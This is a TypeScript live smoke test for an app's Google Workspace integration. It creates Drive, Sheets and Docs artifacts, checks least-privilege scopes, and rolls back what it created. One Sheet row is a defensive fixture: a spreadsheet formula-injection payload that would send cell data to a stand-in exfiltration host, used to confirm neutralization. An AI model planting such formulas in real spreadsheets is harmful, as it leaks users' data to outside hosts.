/**
 * Live Google Workspace smoke test. Run against a real connected Google account:
 *
 *   CLAM_INBOX_LIVE=true pnpm workspace:smoke [inbox-id] [--keep]
 *
 * It creates a Drive folder, a text file, a Sheet (including a formula-injection row), and a Doc through the same
 * policy-gated mission path agents use, verifies every read-back, checks Photos access, and then rolls everything back
 * (only the artifacts this run created) unless --keep is passed.
 */
import { createClamApp } from '../apps/server/src/app.js';
import { mayUse, type GoogleCapability } from '../apps/server/src/auth/google.js';
import { hasLiveFormula } from '../apps/server/src/workspace/sanitize.js';

type Row = { check: string; result: 'PASS' | 'FAIL' | 'SKIP'; detail: string };

async function main() {
  const keep = process.argv.includes('--keep');
  const explicit = process.argv.slice(2).find((value) => !value.startsWith('--'));
  const runtime = await createClamApp();
  const rows: Row[] = [];
  const record = (check: string, ok: boolean | null, detail: string) => rows.push({ check, result: ok === null ? 'SKIP' : ok ? 'PASS' : 'FAIL', detail });
  try {
    if (!runtime.config.inboxLive) throw new Error('Set CLAM_INBOX_LIVE=true and connect a Google account in Settings first.');
    const inboxId = explicit ?? runtime.accounts.activeInboxIds()[0];
    const connection = inboxId ? runtime.accounts.connection(inboxId) : undefined;
    if (!connection || connection.status !== 'active') throw new Error('No active Google connection. Pass an inbox id or reconnect in Settings.');
    const granted = JSON.parse(connection.granted_scopes) as string[];
    const can = (capability: GoogleCapability) => mayUse(granted, capability);
    console.log(`Inbox ${inboxId} (${connection.email})`);
    record('drive.file granted', can('drive:write'), granted.filter((scope) => /drive|documents|spreadsheets|photos/.test(scope)).join(' ') || 'none');
    record('no full Drive scope', !granted.includes('https://www.googleapis.com/auth/drive'), 'least privilege');
    if (!can('drive:write')) throw new Error('Grant "Add Drive, Docs, Sheets & Photos" for this inbox in Settings.');

    const agent = runtime.missions.interactiveAgent(connection.user_id, inboxId, 'other_mcp');
    const stamp = new Date().toISOString().replace(/[:.]/g, '-');
    const folder = ['Clam Smoke', stamp];
    const { result, run_id } = await runtime.missions.direct(agent, { tool: 'workspace_smoke', client: 'clam-workspace-smoke', token_id: 'local-cli', inbox_id: inboxId },
      async (ops) => {
        const made = await ops.ensureFolderPath(folder);
        const file = await ops.saveFile(folder, 'smoke.txt', 'text/plain', { inline_text: 'Clam live smoke ' + stamp + '\n' });
        const sheet = await ops.ensureSpreadsheet('Clam Smoke ' + stamp, made.key, [{ name: 'Rows', headers: ['Vendor', 'Amount', 'Note'] }]);
        const rows = await ops.appendRows('Clam Smoke ' + stamp, 'Rows', [['Figma', 45, 'ok'], ['Evil', 1, '=IMPORTXML("https://exfil.example/?d="&A1,"//a")']], 'Vendor');
        const cells = await ops.updateCells('Clam Smoke ' + stamp, 'Rows', 'C2', [['verified']]);
        const doc = await ops.upsertDoc('Clam Smoke ' + stamp, made.key, 'Smoke test', 'Line one\nLine two', 'replace_section');
        const state = await ops.read(ops.sheetKey('Clam Smoke ' + stamp)) as { tabs: { rows: unknown[][] }[] } | null;
        return { made, file, sheet, rows, cells, doc, state };
      });
    record('folder created + read back', result.made.outcome.verified, folder.join(' / '));
    record('file uploaded + md5 read back', result.file.verified, String(runtime.platform.registry.byId(result.file.artifactId ?? '')?.url ?? ''));
    record('sheet created', result.sheet.verified, String(runtime.platform.registry.byId(result.sheet.artifactId ?? '')?.url ?? ''));
    record('rows appended (RAW) + row count', result.rows.verified && result.rows.rowCount === 2, `rowCount=${result.rows.rowCount}`);
    record('formula injection neutralized', !hasLiveFormula(result.state?.tabs[0].rows ?? [['=']]), JSON.stringify(result.state?.tabs[0].rows[1] ?? null));
    record('cells updated', result.cells.verified, 'Rows!C2');
    record('doc section written + read back', result.doc.verified, String(runtime.platform.registry.byId(result.doc.artifactId ?? '')?.url ?? ''));

    if (can('photos:read')) {
      const adapter = runtime.inbox.workspace(`live:${inboxId}`);
      try {
        const photos = await adapter.searchPhotos({ category: 'RECEIPTS', limit: 3 });
        record('photos search', true, `${photos.length} item(s)`);
      } catch (error) {
        if (error instanceof Error && error.message === 'PHOTOS_PICKER_SELECTION_REQUIRED' && adapter.startPhotoPicker) {
          const session = await adapter.startPhotoPicker();
          record('photos picker session', true, 'Open to select receipts, then rerun: ' + session.picker_uri);
        } else record('photos search', false, error instanceof Error ? error.message : 'failed');
      }
    } else record('photos', null, 'Photos scope not granted');

    if (keep) record('rollback', null, '--keep: artifacts left in Drive');
    else {
      const rolled = await runtime.inbox.rollback(run_id).done;
      const remaining = runtime.platform.artifacts(connection.user_id, agent.id).filter((row) => row.last_updated_by_run_id === run_id);
      record('rollback removed created artifacts', rolled.status === 'COMPLETED' && remaining.length === 0, `${rolled.status}, ${remaining.length} remaining`);
    }
  } catch (error) {
    record('smoke run', false, error instanceof Error ? error.message : 'failed');
  } finally {
    await runtime.close();
  }
  console.table(rows);
  if (rows.some((row) => row.result === 'FAIL')) process.exitCode = 1;
}

void main();
